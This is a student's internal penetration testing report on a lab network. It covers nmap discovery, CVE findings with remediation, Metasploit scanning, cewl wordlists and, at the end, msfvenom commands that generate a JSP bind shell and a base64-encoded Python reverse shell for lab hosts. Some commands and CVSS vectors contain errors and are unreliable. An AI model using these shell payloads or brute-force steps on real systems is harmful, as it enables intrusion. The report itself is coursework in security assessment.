# INTERNAL PENETRATION TESTING 
  ### REPORT   

    NAME: AYAABA DANIEL AWINKELA

    INDEX NUMBER: 7164921

    PROGRAM: TELECOMMUNICATIONS ENGINEERING

    YEAR: THREE (3)  

    INDUSTRY: VIA 


## TABLE OF CONTENT 

+ Host Discovery
    + Explanation
    + Ping and list scans
    + Host reconnaissance
    + Aiodnsbrute
  
+ Service discovery and port scanning
    + Port sweep
    + Service discovery
    + Importance of port and service discovery
    + Service separation into protocols
  
+ Summary of Findings
    + Incomplete fix of Apache server				
    + MySQL Server DDL Privilege Escalation
    + SQL Denial of Service	
    + RealVNC Local Privilege Escalation				
    + SMTP Smuggling			
    + Elevation of Privilege
    + BSD telnetd Sensitive Environment Variable Exposure		
    + Shell bind in Java		
    + Reverse shell bind in Python
  
+ Quality severity rating 
    + CVSS v3.1 table 
+ Vulnerability Scanning
    + Metasploit 
        + MySQL scans
        + VNC scans
        
    + Custom list creation
        + Situations for the need of custom list
  
+ Web based attack surfaces
    + Eyewitness scan 
        + Definitions
        + Importance of eyewitness
  
+ Payload Generation 
    + Java payloads
        + Command usage
        + Victims
    + Python payloads
        + Command usage 
        + Victims
    + Payloads folder 


### HOST DISCOVERY
### Explanation
It refers to the process of identifying which hosts (computers or devices) are active and responsive on a network. When performing penetration testing, this is often the first step before proceeding with more detailed scans. Host discovery allows you to find out which systems are up and which are down, helping to narrow the focus for further analysis.

### Ping scan   
  - ***command = nmap -sn 10.10.10.0/24***
  
![alt text](<Screenshot from 2024-09-17 08-17-35.png>)


### Information gathering
1. Perform the host discovery again and save the output in a grepable format to a file.
   - *command = nmap -sn 10.10.10.0/24 | grep -i "nmap report for" | awk '{print $5}' > alive_hosts.txt*
  
  ![alt text](<Screenshot from 2024-09-17 08-25-56.png>)
   
2. Verify the contents of the new file by viewing it with the ***cat*** command.  
     - *command = cat alive_hosts.txt*
  
  ![alt text](<Screenshot from 2024-09-17 08-27-57.png>)
   
3. Perform a detailed scan on the discovered hosts for more information (host reconnaissance)
     - *command = nmap -p 1-100 -sV -iL live_hosts.txt -oN detailed_scan.txt*
  
 ![alt text](<Screenshot from 2024-09-17 08-32-18.png>)


### AIODNSBRUTE
It is a Python library that provides an asynchronous DNS brute-force attack tool. It allows you to efficiently enumerate subdomains of a target domain by attempting to resolve them using DNS queries.

**Command**  
sudo aiodnsbrute -w /usr/share/wordlists/oracle_default_passwords.txt

![alt text](<Screenshot from 2024-09-17 14-55-59.png>)
Three subdomains were found after bruteforcing the domain virtualinfosecafrica.  
    
  | Subdomain                      | Ip address     |
  | -----------                    | ------------   |
  | 1. ftp.virtualinfosecafrica.com   | 192.185.23.171 |
  | 2. whm.virtualinfosecafrica.com   | 192.185.23.171 |
  | 3. www.virtualinfosecafrica.com   | 192.185.23.171 |

##  SERVICE DISCOVERY and PORT SCANNING

**PORT SCANNING**  
    Helps identify which ports are open on a target system. Each port may represent a different service or application running on the server.    
   - *command = nmap --top-ports 100 10.10.10.0*
  
  ![alt text](<Screenshot from 2024-09-17 08-36-51.png>)

**SERVICE DISCOVERY**  
   Once open ports are identified, service discovery determines what services or applications are running on those ports. This can reveal information about the software versions and configurations.  
 -  *command = nmap -sV 10.10.10.0 -oG scan_results.gnmap*
  
 ![alt text](<Screenshot from 2024-09-17 08-38-00-1.png>)
  

**PURPOSE**  
|||
|:----------------| :---------------|
| Vulnerability Identification | Knowing which services are running and their versions can help identify vulnerabilities|
| Asset Inventory | Service discovery and port scanning help create a detailed inventory of networked devices and services.|
|Configuration Review| Ensures that services are configured according to best practices and compliance requirements.|
|Detect Unauthorized Services|Port scanning can reveal unauthorized or unexpected services running on the network, which could indicate a breach or misconfiguration.|
|Resource Utilization| Identifying services and their associated ports helps in understanding resource utilization and optimizing network performance.|
|Capacity Planning| Helps in planning for capacity and scaling by understanding the load and demands on different services.|


**PROTOCOLS IN SERVICE DISCOVERY**  

1. Service scan: nmap -sV 10.10.10.0/24 -oG scan_results.gnmap
   
2. Grep TCP protocol: grep '/tcp' scan_results.gnmap > tcp_ports.txt
   
3.  Grep UDP protocol: grep '/udp' scan_results.gnmap > udp_ports.txt
   
4. View results in the grepped files: 
   - cat tcp_ports.txt
  
   - cat udp_ports.txt
5. Print specific columns:
   - awk '/ \ /tcp/ {print $2, $4}' scan_results.gnmap > tcp_ports_summary.txt
  
   - awk '/ \ /udp/ {print $2, $4}' scan_results.gnmap > udp_ports_summary.txt

*NOTE:*   
The services (https, http, vnc, telnet, mysql, rdp,smtp, ssl,netbios-ssn and microsoft-ds) were all grouped under the tcp ports. 

## SUMMARY OF FINDINGS ##
|Findings|Severity Score|Severity Status|
|---------|---------|---------|
|Incomplete fix of Apache server||
|MySQL Server DDL Privilege Escalation|4.4|Medium|
|SQL Denial of Service|4.9|Medium|
|RealVNC Local Privilege Escalation||
|SMTP Smuggling||
|Elevation of Privilege|7.8|High|
|BSD telnetd Sensitive Environment Variable Exposure||
|Shell bind in Java||
|Reverse shell bind in Python||


## MITRE CVE DATABASE 

### Apache Limitation: Incomplete fix of CVE-2021-41773 

**Description**  
It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.

CVSS
|score|severity|version|vector string|
|--------|--------|--------|--------|
|7.5|High|3.1|CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H|
  
  **Solution**  
  Updating Apache HTTP Server to version 2.4.51 or later is the recommended solution.

  **Victims**  
10.10.10.2,10.10.10.30, 10.10.10.45, 10.10.10.55



### Limitation: MySQL Server DDL Privilege Escalation Vulnerability

**Description**  
Vulnerability in the MySQL Server product of Oracle MySQL server DDL. Supported versions that are affected are 5.6.49 and prior, 5.7.31 and prior and 8.0.21 and prior. Difficult to exploit vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.1 Base Score 4.4 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H).

CVSS
|score|severity|version|vector string|
|--------|--------|--------|--------|
|4.4|Medium|3.1|CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H|

**Solution**
* Network segmentaion
* Upgrade to a patched version 

**Victims**
10.10.10.5, 10.10.10.40



### Limitation: SQL Denial of Service

**Description**  
The MySQL Server product of Oracle (versions 5.6.49 and prior, 5.7.31 and prior, and 8.0.21 and prior) has a vulnerability in its Optimizer component that allows a highly privileged attacker with network access to exploit the server. This vulnerability could lead to a Denial of Service (DoS) attack, causing the MySQL server to hang or crash repeatedly. The Common Vulnerability Scoring System (CVSS) rates this vulnerability as a 4.9, indicating a medium-severity impact, particularly affecting system availability.


CVSS 

|score|severity|version|vector string|
|--------|--------|--------|--------|
|4.9|medium|3.1|CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H|

**Solution**
* update to the latest version
* restrict neetwork access
* strenghten access control
* monitor for suspicious activity

**Victims**  
10.10.10.5, 10.10.10.40


### RealVNC Limitaion: Local privilege escalation

**Description**
The vulnerability in **RealVNC VNC Server (before version 6.11.0)** and **VNC Viewer (before version 6.22.826)** on Windows allows local privilege escalation through the MSI installer’s Repair mode. This flaw enables a local attacker to gain elevated privileges on the system, potentially leading to unauthorized actions or system control. The issue can be exploited by users with limited access, allowing them to escalate privileges and compromise system security. 

CVSS
|score|severity|version|vector string|
|--------|--------|--------|--------|
|7.8|High|3.1|CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H|

**Solution**
* Updating to the latest versions of VNC Server and Viewer is recommended.
* Restriction of local user privileges
* Disable msi repair mide if not needed

**Affected Resource**  
10.10.10.10

### Limitation: Elevation of Privilege 

**Description**  
A vulnerability exists in **Microsoft Windows when Folder Redirection** is enabled via Group Policy, particularly when the folder redirection file server is co-located with a Terminal Server. An attacker could exploit this vulnerability by creating a new folder under the Folder Redirection root path and setting up a junction. When a new user logs in, the system redirects their personal data to this malicious folder, allowing the attacker to gain unauthorized access to sensitive files. This issue requires reconfiguring Folder Redirection and setting strict permissions, as it cannot be fixed with a security update.

CVSS

|score|severity|version|vector string|
|--------|--------|--------|--------|
|7.8|High|3.1|CCVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C|


**Solution**  
* Reconfigure folder redirection with offline files
* Restrict permissions on the folder redirection root path
* Separate file servers from terminal servers

**Victim**   
10.10.10.11, 10.10.10.31, 10.10.10.60

**References**  
[https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26887]()



### SMTP Smuggling

**Description**  
In Exim versions prior to 4.97.1, there is a vulnerability related to SMTP smuggling in specific PIPELINING/CHUNKING configurations. This issue arises because Exim accepts a certain character sequence (<LF>.<CR><LF>), which some other email servers do not. Attackers can exploit this vulnerability to inject emails with spoofed sender addresses, thereby bypassing the Sender Policy Framework (SPF) protection that prevents email spoofing. The vulnerability can allow unauthorized mail to be accepted and delivered by vulnerable mail servers.

CVSS
|score|severity|version|vector string|
|--------|--------|--------|--------|
|7.5|High|3.1|CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H|

**Solution**  
* upgrade to the latest version of Exim
* Disable pipelining/chunking
* Ensure proper SPF configuration

**Victims**  
10.10.10.15

**References**  
[https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/]()

 
### BSD telnetd Limitation: Sensitive Environment Variable Exposure

**Description**  
A vulnerability exists in certain BSD-based Telnet clients, including those on Solaris and SuSE Linux, where remote malicious Telnet servers can exploit the NEW-ENVIRON option using the SEND ENV_USERVAR command. This allows the attacker to read sensitive environment variables, potentially exposing confidential information such as user credentials or system configurations. The vulnerability arises from improper handling of environment variables during Telnet sessions.

CVSS
|score|severity|version|vector string|
|--------|--------|--------|--------|
|0.0|None*|3.1|CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H|

**Solution**
* Disable Telnet and use secure alternatives
* Apply security patches
* Restrict access to Telnet 
* Monitor for malicious activity

**Victims**  
10.10.10.20

**References**  
* [http://lists.apple.com/archives/security-announce/2006//Aug/msg00000.html]()
* [http://www.redhat.com/support/errata/RHSA-2005-504.html]()
* [http://securitytracker.com/id?1014203]()


### QUALITY SEVERITY RATING

CVSS v3.1 Rating

|Severity|Score range|
|--------|-------------|
|None*|0.0|
|Low|0.1 - 3.9|
|Medium|4.0 - 6.9|
|High|7.0 - 8.9|
|Critical|9.0 - 10.0|

## EXPLOITDB 
   
**Apache httpd 2.4.49**    
It is an http service version type

**Limitation**  
 Path traversal and remote code execution


**Victims**  
10.10.10.2,10.10.10.30, 10.10.10.45, 10.10.10.55

**solution**  
  Updating Apache HTTP Server to version 2.4.51 or later is the recommended solution.

**MySQL 5.6.49**  

**Limitation 1**  
User Privilege Escalation


**Victims**
10.10.10.5, 10.10.10.40

**Solution**
* network segmentaion
* upgrade to a patched version 
 
**Limitation 2**   
Local Credentials Disclosure


**Victims**  
10.10.10.5, 10.10.10.40

**Solution**  
* Strong password policies
* Regular patching
* Audit logging 
* Secure remote access
 
**Limitation**  
Remote Denial of Service

**Victims**  
10.10.10.5, 10.10.10.40

**Solution**  
* Server upgrade
* Configure MySQL settings
* Hardware and software optimization
* Use of commercial DoS protection services

**Microsoft Terminal Services**

**Limitation**  
Use after free


**Victims**  
10.10.10.11

**Solution**  
* Upgrade to patch versions
* Apply workarounds
* Implement best security practices


**Ultra VNC 1.2.4.0**  

**Limitation**  
VNC server DoS


**Victims**  
10.10.10.50

**Solution**  
* Patch upgrade
* Disable VNC
* Restrict VNC
* Use strong password

## **Vulnerability Scanning** ##  
Vulnerability Scanning with Metasploit Auxiliary Module: Focusing on MySQL, VNC, RDP, and SMB.  

## Metasploit  
A powerful penetration testing framework that can be used to identify and exploit vulnerabilities in various services and applications. When assessing the security of a network, it's essential to conduct vulnerability scanning to identify potential weaknesses that could be exploited by malicious actors.

### MySQL Vulnerability Scanning

* **Bruteforcing:** Metasploit offers tools like `msfconsole` to launch brute-force attacks against MySQL servers. By trying various combinations of usernames and passwords, you can attempt to gain unauthorized access.
  
* **SQL Injection:** Look for vulnerabilities like SQL injection, which can allow attackers to execute arbitrary SQL commands. Metasploit has modules specifically designed for SQL injection testing.

![alt text](<Screenshot from 2024-09-17 15-08-14.png>)

### VNC Vulnerability Scanning

* **Weak Credentials:** VNC servers can be vulnerable to brute-force attacks if they have weak or default credentials. Metasploit can be used to launch brute-force attacks against VNC.
  
* **Unauthorized Access:** Ensure that VNC access is restricted to authorized users and that appropriate security measures are in place to prevent unauthorized access.

![alt text](<Screenshot from 2024-09-17 15-11-24.png>)

### SMB Vulnerability Scanning

* **EternalBlue**  
Metasploit has modules for exploiting vulnerabilities like EternalBlue, which have been used in ransomware attacks.
  
* **SMB Relay**  
Be aware of SMB relay attacks, which can be used to gain unauthorized access to network resources.
  
* **SMB Signing**  
Ensure that SMB signing is enabled to protect against spoofing attacks.

![alt text](<Screenshot from 2024-09-17 15-13-47.png>)

### RDP Vulnerability Scanning

* **Bruteforcing:** RDP servers are often targeted by brute-force attacks. Metasploit can be used to launch these attacks and attempt to gain unauthorized access.

* **Credential Stuffing:** Be aware of credential stuffing attacks, where attackers use stolen credentials from other breaches to attempt to log in to RDP servers.
  
* **Weak Encryption:** Ensure that RDP is configured to use strong encryption protocols to protect against man-in-the-middle attacks.

![alt text](<Screenshot from 2024-09-17 15-16-59.png>)

## Creating a Custom Wordlist Using Cewl

Cewl (Custom Word List generator) is a tool that extracts words from web pages to create a custom wordlist. This can be particularly useful in penetration testing and security assessments, where specific, target-related terms can significantly enhance the effectiveness of attacks such as password cracking or brute-force attacks.

***COMMAND: cewl -m 5 -w custom_passlists.txt --with-numbers -c -v https://www.virtualinfosecafrica.com***

![alt text](<Screenshot from 2024-09-17 15-21-20.png>)

## CUSTOM WORDLIST IMPORTANCE

**Password Cracking**  
* Target-Specific Attacks   
  When performing password cracking against a target's system or application, using a custom wordlist tailored to the target's context (e.g., company names, product names) can be more effective than generic wordlists.

* Brute-Force Attacks  
        
    Customized Attacks: For brute-forcingauthentication services (e.g., SSH, FTP), a custom wordlist that includes potential usernames and passwords specific to the target can yield better results.

**Social Engineering:**
* Phishing Campaigns  

  If you are conducting a social engineering attack, having a wordlist that includes names of employees, departments, or internal jargon can help craft more convincing phishing emails or messages.

**Security Assessments:**
* Penetration Testing  

   During penetration testing, generating a custom wordlist from a company's website can uncover security issues such as weak passwords or predictable patterns that are specific to the organization.

## WEB-BASED ATTACK SURFACES

**EyeWitness** is a tool used to automate the process of gathering information about web services by taking screenshots of websites, identifying default credentials, and providing quick access to web application metadata. It's particularly useful for penetration testers, security analysts, and researchers when assessing web applications across multiple hosts.

### Features
- **Screenshots**: Captures screenshots of websites, which helps in quickly reviewing exposed web services.
- **Web Application Scanning**: Focuses on web services and supports both HTTP and HTTPS.
- **Metadata Collection**: Gathers information such as HTTP headers and title pages to give insights into the services running.
- **Handling Non-Standard Ports**: EyeWitness can handle web servers running on non-standard ports, which is common in internal networks.
- **Report Generation**: Generates HTML-based reports that include the screenshots and metadata for easy review.


## PAYLOAD GENERATION 

**JAVA PAYLOAD**  
I will use the command below to generate the payload and later drop it on the apache tomcat webserver in order to get a shell bind .

**COMMAND:**   
msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f raw > bind_shell.jsp

![alt text](<Screenshot from 2024-09-17 09-07-15.png>)

**VICTIM**  
10.10.10.55

**PYTHON PAYLOAD**  
1. Generate a reverse shell payload that will be encoded in base64.  
   * Reverse shell bind command  

   * Encode python payload to base64
   
2. Send the base64 payload to the Python server running on the target host 10.10.10.30.
   
3. Decode and execute the payload on the server.
   
4. Connect to the shell using the Netcat tool.

**COMMAND**  
msfvenom -p python/shell_reverse_sctp LHOSTS=10.10.10.30 -f python -e cmd/base64 -o payloads.py

![alt text](<Screenshot from 2024-09-17 09-06-17.png>)


**VICTIM**   
10.10.10.30








